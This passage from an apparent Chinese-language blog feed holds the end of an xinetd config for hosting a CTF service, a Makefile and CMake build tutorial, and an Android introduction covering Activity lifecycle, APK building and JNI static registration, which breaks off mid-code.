<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service ctf  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">disable</span> = no  </span><br><span class="line">socket_type = stream  </span><br><span class="line">protocol = tcp  </span><br><span class="line"><span class="built_in">wait</span> = no  </span><br><span class="line">user = pwn  </span><br><span class="line"><span class="built_in">type</span> = UNLISTED  </span><br><span class="line">port = 25000  </span><br><span class="line"><span class="built_in">bind</span> = 0.0.0.0  </span><br><span class="line">server = /run.sh    <span class="comment"># 修改处</span></span><br><span class="line"><span class="comment"># replace helloworld to your program  </span></span><br><span class="line">banner_fail = /etc/banner_fail  </span><br><span class="line"><span class="comment"># safety options  </span></span><br><span class="line">per_source = 10 <span class="comment"># the maximum instances of this service per source IP address  </span></span><br><span class="line">rlimit_cpu = 20 <span class="comment"># the maximum number of CPU seconds that the service may use  </span></span><br><span class="line"><span class="comment">#rlimit_as = 1024M # the Address Space resource limit for the service  </span></span><br><span class="line"><span class="comment">#access_times = 2:00-9:00 12:00-24:00  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Cmake 使用</title>
    <url>/2023/09/09/Cmake%20%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>编写自动化构建脚本</p>
</blockquote>
<span id="more"></span>

<h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><ul>
<li><p>应该叫 GNU Make，在Linux 平台常用</p>
</li>
<li><p>打印信息</p>
</li>
</ul>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不显示中间过程以及命令</span></span><br><span class="line">@echo <span class="string">&quot;begin make&quot;</span></span><br><span class="line">@<span class="variable">$(CXX)</span>  <span class="variable">$^</span> -o <span class="variable">$(TARGET)</span></span><br><span class="line">@echo <span class="string">&quot;build success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 报错处理, 报错后不会向下执行，我们在前面加上一个 `-` 符号就行</span></span><br></pre></td></tr></table></figure>

<ul>
<li>项目结构</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hello/</span><br><span class="line">├── main.cpp</span><br><span class="line">├── factorial.cpp</span><br><span class="line">├── printhello.cpp</span><br><span class="line">└── functions.h</span><br></pre></td></tr></table></figure>

<ul>
<li>朴素版</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">g++ main.cpp factorial.cpp printhello.cpp -o main</span><br><span class="line">./main</span><br></pre></td></tr></table></figure>

<h3 id="version1"><a href="#version1" class="headerlink" title="version1"></a>version1</h3><ul>
<li>tab而不是空格</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">hello: main.cpp printhello.cpp factorial.cpp</span></span><br><span class="line">	g++ -o hello main.cpp printhello.cpp factorial.cpp</span><br></pre></td></tr></table></figure>

<h3 id="version2"><a href="#version2" class="headerlink" title="version2"></a>version2</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"><span class="section">main.o: main.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c main.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">printhello.o: printhello.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c printhello.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">factorial.o: factorial.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c factorial.cpp</span><br></pre></td></tr></table></figure>

<h3 id="version3"><a href="#version3" class="headerlink" title="version3"></a>version3</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wall warning all</span></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHONY 避免冲突。比如有一个 clean 的可执行文件？</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<h3 id="version4"><a href="#version4" class="headerlink" title="version4"></a>version4</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件下所有的cpp</span></span><br><span class="line">SRC = <span class="variable">$(<span class="built_in">wildcard</span> *.cpp)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 意思为 SRC中的.cpp替换为.o</span></span><br><span class="line">OBJ = <span class="variable">$(<span class="built_in">patsubst</span> %.cpp, %.o, <span class="variable">$(SRC)</span>)</span></span><br><span class="line"></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>
<h2 id="CMake"><a href="#CMake" class="headerlink" title="CMake"></a>CMake</h2><ul>
<li>Linux 命令行，cmake <strong>生成 makefile</strong>，然后在 make 生成可执行文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cmake .</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>

<ul>
<li>Windows 命令行</li>
</ul>
<ol>
<li>MinGW 环境，不是我的选择，因为由 MSVC</li>
<li>CMake，首先生成缓存，最后编译</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cmake <span class="literal">-B</span> build</span><br><span class="line">cmake <span class="literal">--build</span> build</span><br></pre></td></tr></table></figure>

<ul>
<li>配合 VsCode 使用</li>
</ul>
<p>Ctrl + shift + p 进入命令 ： cmake build 就能生成build 目录，出现我们的需要的exe文件</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul>
<li>最简单的 CmakeLists</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ cmake 版本要求 ]]</span></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 工程名 ]]</span></span><br><span class="line"><span class="keyword">project</span> (<span class="keyword">test</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 可执行文件 ]]</span></span><br><span class="line"><span class="keyword">add_executable</span> (main main.cpp)</span><br></pre></td></tr></table></figure>

<ul>
<li>set 设置变量</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span>(SRC main.cpp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span> (main <span class="variable">$&#123;SRC&#125;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>C&#x2F;C++ 标准 比如 <code>-std=c99</code></li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span>(CMAKE_C_STANDARD <span class="number">11</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">11</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>file</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ 匹配所有的文件名 ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB &lt;variable&gt; [LIST_DIRECTORIES <span class="keyword">true</span>[<span class="keyword">false</span>]] [RELATIVE &lt;path&gt; ] [CONFIGURE_DEPENDS] [&lt;globbing-expression&gt; ...])</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 将 /usr/lib/inlcude/ 下所有 c文件 赋值给 SRC ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB SRC /usr/lib/inlcude/*.c)</span><br></pre></td></tr></table></figure>

<ul>
<li>宏</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ 当前CMakeLists所在文件夹 ]]</span></span><br><span class="line">CMAKE_CURRENT_SOURCE_DIR </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 最外层CMakeLists.txt所在目录 ]]</span></span><br><span class="line">CMAKE_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 离 CMakeLists.txt 最近的一层文件夹 ]]</span></span><br><span class="line">PROJECT_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 二进制文件输出路径，可自行set ]]</span></span><br><span class="line">EXECUTABLE_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 库输出路径 ]]</span></span><br><span class="line">LIBRARY_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ 编译器编译选项 ]]</span></span><br><span class="line">CMAKE_CXX_FLAGS</span><br></pre></td></tr></table></figure>

<ul>
<li>打印信息</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">message</span>()</span><br></pre></td></tr></table></figure>

<ul>
<li>制作链接库</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(&lt;name&gt; [STATIC | SHARED | MODULE]</span><br><span class="line">            [EXCLUDE_FROM_ALL]</span><br><span class="line">            [source1] [source2 ...])</span><br><span class="line"><span class="comment">#[[ STATIC(静态库) SHARED(动态库) MODULE(模块库) ]]</span></span><br></pre></td></tr></table></figure>

<ul>
<li>添加库，类似于 <code>gcc -lpthread</code></li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">target_link_libraries</span>(main pthread)</span><br></pre></td></tr></table></figure>

<h3 id="多文件夹"><a href="#多文件夹" class="headerlink" title="多文件夹"></a>多文件夹</h3><ul>
<li>包含头文件</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include_directories</span>(<span class="variable">$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;</span>/<span class="keyword">include</span>/)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>包含源文件：file</p>
</li>
<li><p>多个可执行文件，比如简单的 web 服务器</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree</span><br><span class="line">server</span><br><span class="line">|-- client</span><br><span class="line">|	|-- client.c</span><br><span class="line">|	|-- CMakeLists.txt</span><br><span class="line">|-- server</span><br><span class="line">|	|-- server.c</span><br><span class="line">|	|-- CMakeLists.txt</span><br><span class="line">|-- CMakeLists.txt</span><br></pre></td></tr></table></figure>


<ul>
<li>添加子目录，要求子目录必须含有 CmakeLists.txt</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ 包含子目录 ]]</span></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)</span><br></pre></td></tr></table></figure>

<ul>
<li>最外层</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (tftp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)                </span><br><span class="line"><span class="keyword">add_subdirectory</span>(server)</span><br></pre></td></tr></table></figure>

<ul>
<li>clent &amp; server</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (server)</span><br><span class="line"><span class="keyword">add_executable</span> (server server.cpp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[-----------------------------]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (client)</span><br><span class="line"><span class="keyword">add_executable</span> (client client.cpp)</span><br></pre></td></tr></table></figure>

<h3 id="编译成库"><a href="#编译成库" class="headerlink" title="编译成库"></a>编译成库</h3><ul>
<li>将include编译成库，然后在编译时指定库 (packet: 网络数据包，在client 和 server 都会使用)</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD_LIBRARY</span>(packet STATIC packet.cpp)</span><br></pre></td></tr></table></figure>

<ul>
<li>项目添加动态链接库：包含库 + 二进制文件链接</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">link_directories</span>(</span><br><span class="line">    <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/lib</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(client PUBLIC packet)</span><br></pre></td></tr></table></figure>

<h3 id="添加cpp文件"><a href="#添加cpp文件" class="headerlink" title="添加cpp文件"></a>添加cpp文件</h3><ul>
<li>或许最简单，我们也可以使用其他的宏和函数获取cpp文件添加</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add_executable</span> (client client.cpp <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/packet/packet.cpp)</span><br></pre></td></tr></table></figure>

<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><blockquote>
<p>主要是在 vscode 中配合 LLVM 工具链进行debug。~~CLion 啥都有🫢 ~~</p>
</blockquote>
<p>环境：vscode + llvm + clangd插件 + code-lldb插件</p>
<ul>
<li>写好一个cmake工程</li>
</ul>
<p>f5 进行调试，需要文件夹下有一个 <code>.vscode</code> 文件夹，配置<code>launch.json</code>。其中有一个属性：<code>program</code> 修改为我们的生成的二进制文件就行</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">       <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;windows&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/build/Debug/test.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span></span><br><span class="line">       <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="punctuation">]</span></span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<ul>
<li>lldb 指令和 gdb 类似，我们可以在下面的 debug 窗口 进行单步执行</li>
</ul>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>cmake</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-2</title>
    <url>/2023/10/18/Android-2/</url>
    <content><![CDATA[<blockquote>
<p>安卓新人😋</p>
</blockquote>
<span id="more"></span>

<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><ol>
<li>Android Studio 创建一个项目，等待gradle</li>
<li>想要run起来，创建一个device。在Android Studio顶栏，device manager -&gt; create.</li>
</ol>
<ul>
<li>什么都先选第一个，缺什么东西使用IDE下载</li>
</ul>
<h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><p>Activity代表了一个具有用户界面的单一屏幕</p>
<p>Android 初始化是通过 Activity 中的 onCreate() 回调的调用开始的。存在有一序列的回调方法来启动一个活动，同时有一序列的方法来关闭活动</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>onCreate()</td>
<td>这是第一个回调，在活动第一次创建时调用</td>
</tr>
<tr>
<td>onStart()</td>
<td>这个回调在活动为用户可见时被调用</td>
</tr>
<tr>
<td>onResume()</td>
<td>这个回调在应用程序与用户开始可交互的时候调用</td>
</tr>
<tr>
<td>onPause()</td>
<td>被暂停的活动无法接受用户输入，不能执行任何代码。当前活动将要被暂停，上一个活动将要被恢复时调用</td>
</tr>
<tr>
<td>onStop()</td>
<td>当活动不在可见时调用</td>
</tr>
<tr>
<td>onDestroy()</td>
<td>当活动被系统销毁之前调用</td>
</tr>
<tr>
<td>onRestart()</td>
<td>当活动被停止以后重新打开时调用</td>
</tr>
</tbody></table>
<h3 id="bundle"><a href="#bundle" class="headerlink" title="bundle"></a>bundle</h3><p>Bundle主要用于<strong>传递数据</strong>：它保存的数据，是以key-value(键值对)的形式存在的。</p>
<p>我们经常使用<em>Bundle在Activity之间传递数据</em>，传递的数据可以是boolean、byte、int、long、float、double、string等基本类型或它们对应的数组，也可以是对象或对象数组。当Bundle传递的是对象或对象数组时，实现Serializable 或 Parcelable 接口。</p>
<h3 id="常见组件"><a href="#常见组件" class="headerlink" title="常见组件"></a>常见组件</h3><ol>
<li>onclick：点击事件</li>
<li>button：按钮</li>
<li>EditText：<br>编辑文本控件<br>编辑框（EditText）是TextView 的子类，在TextView 的基础上增加了文本编辑功能，用于处理用户输入，例如登录框等，是非常常用的组件。</li>
</ol>
<h3 id="APK"><a href="#APK" class="headerlink" title="APK"></a>APK</h3><p>android 创建一个空项目，打开hello xxx。先不在意细节，直接编译，可以直接运行（创建一个模拟器）</p>
<p>打包成APK文件：</p>
<ol>
<li>Build -&gt; Build Bundles&#x2F;Apks -&gt; Build APKs</li>
<li>Build -&gt; Make Project 然后在执行1</li>
<li>路径 app&#x2F;build&#x2F;outputs&#x2F;apk</li>
</ol>
<p>如果是debug版本，需要更改 build variants 为 release</p>
<p>然后就可以在jadx中反编译看看。</p>
<h2 id="Native"><a href="#Native" class="headerlink" title="Native"></a>Native</h2><ol>
<li>Android Studio选择创建一个native C++ 项目，等待gradle</li>
<li>出现一个 <code>cpp</code> 的文件夹，这就是我们需要写的库。同时存在java文件夹</li>
</ol>
<ul>
<li>device创建或者使用已经存在的</li>
</ul>
<ol start="3">
<li>Java层导入库</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123; System.loadLibrary(<span class="string">&quot;xxx&quot;</span>); &#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>在Java代码中出现如下的方法</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">demo</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<h3 id="jni-h"><a href="#jni-h" class="headerlink" title="jni.h"></a>jni.h</h3><blockquote>
<p>在android ndk 下可以找到，直接采使用 find 命令找。</p>
</blockquote>
<ol>
<li>某些类型</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span>*           jobject;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jclass;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jstring;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jarray;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>JNIEnv 和 JavaVM声明，在C和C++ 用法不太相同。</li>
</ol>
<p>JNI 定义了两个关键数据结构，即<code>JavaVM</code>和<code>JNIEnv</code>。两者本质上都是指向函数表的二级指针。（在 C++ 版本中，它们是一些类，这些类具有指向函数表的指针，并具有每个通过该函数表间接调用的 JNI 函数的成员函数。）JavaVM 提供<code>调用接口</code>函数，您可以利用此类来函数创建和销毁 JavaVM。理论上，每个进程可以有多个 JavaVM，但 Android 只允许有一个。</p>
<p>JNIEnv 提供了大部分 JNI 函数。原生函数都会收到 JNIEnv 作为第一个参数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JNIEnv</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* C_JNIEnv;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line"><span class="keyword">typedef</span> _JNIEnv JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> _JavaVM JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>JavaVM 原型</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* functions;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line">    <span class="function">jint <span class="title">DestroyJavaVM</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DestroyJavaVM</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThread</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThread</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">DetachCurrentThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DetachCurrentThread</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">GetEnv</span><span class="params">(<span class="type">void</span>** env, jint version)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">GetEnv</span>(<span class="keyword">this</span>, env, version); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThreadAsDaemon</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThreadAsDaemon</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/*__cplusplus*/</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span> &#123;</span><br><span class="line">    <span class="type">void</span>*       reserved0;</span><br><span class="line">    <span class="type">void</span>*       reserved1;</span><br><span class="line">    <span class="type">void</span>*       reserved2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">jint</span>        (*DestroyJavaVM)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThread)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">    <span class="built_in">jint</span>        (*DetachCurrentThread)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*GetEnv)(JavaVM*, <span class="type">void</span>**, jint);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThreadAsDaemon)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>JNIEnv</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span> &#123;</span><br><span class="line">   <span class="comment">// xxx 比较多</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>native method，签名有个具体的表</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* signature;</span><br><span class="line">    <span class="type">void</span>*       fnPtr;</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure>

<h3 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h3><ol>
<li>静态注册的函数名一般为 <code>Java_包名_类名_函数名</code> 将包名中的 <code>.</code> 替换为 <code>_</code> 就是native层函数的名称</li>
<li>函数：从<code>jni.h</code> 可以看出，第一个是JNIEnv，第二个为jclass，然后就是Java层代码的参数</li>
<li>android studio 创建一个native C++ 默认为静态注册</li>
</ol>
<p>native-lib.cpp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> </span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL  </span></span><br><span class="line"><span class="function"><span class="title">Java_com_learn_native_1lib_MainActivity_stringFromJNI</span><span class="params">(  </span></span></span><br><span class="line"><span class="params"><span class="function">        JNIEnv* env,  </span></span></span><br><span class="line"><span class="params"><span class="function">        jobject <span class="comment">/* this */</span>)</span> </span>&#123;  </span><br><span class="line">    std::string hello = <span class="string">&quot;Hello from C++&quot;</span>;  </span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(hello.<span class="built_in">c_str</span>());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>java层</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.native_lib;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;  </span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.learn.native_lib.databinding.ActivityMainBinding;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Used to load the &#x27;native_lib&#x27; library on application startup.  </span></span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native_lib&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);  </span><br><span class="line">  </span><br><span class="line">        binding = ActivityMainBinding.inflate(getLayoutInflater());  </span><br><span class="line">        setContentView(binding.getRoot());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// Example of a call to a native method  </span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tv</span> <span class="operator">=</span> binding.sampleText;  </span><br><span class="line">        tv.setText(stringFromJNI());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span 